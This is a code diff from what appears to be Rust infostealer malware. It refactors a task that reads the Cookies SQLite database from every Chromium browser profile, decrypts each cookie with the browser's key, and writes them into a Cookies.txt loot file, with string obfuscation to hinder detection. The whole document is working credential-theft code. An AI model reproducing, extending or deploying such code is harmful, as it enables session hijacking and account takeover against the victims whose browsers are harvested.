@@ -1,8 +1,7 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use database::TableRecord;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
@@ -28,25 +27,17 @@ impl Task for CookiesTask {
     parent_name!("Cookies.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let Some(cookies) = collect_from_all_profiles(
+        let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles, 
-            |profile| read_cookies(profile, &self.browser)
+            |profile| profile / s!("Network") / s!("Cookies"),
+            s!("Cookies"),
+            |record| extract_cookie_from_record(record, &self.browser)
         ) else {
             return
         };
 
         let _ = to_string_and_write_all(&cookies, "\n", parent);
     }
-}
-
-fn read_cookies(profile: &Path, browser_data: &BrowserData) -> Option<Vec<Cookie>> {
-    let cookies_path = profile / s!("Network") / s!("Cookies");
-    
-    read_sqlite3_and_map_records(
-        &cookies_path, 
-        s!("Cookies"), 
-        |record| extract_cookie_from_record(record, browser_data)
-    )
 }
 
 fn extract_cookie_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<Cookie> {
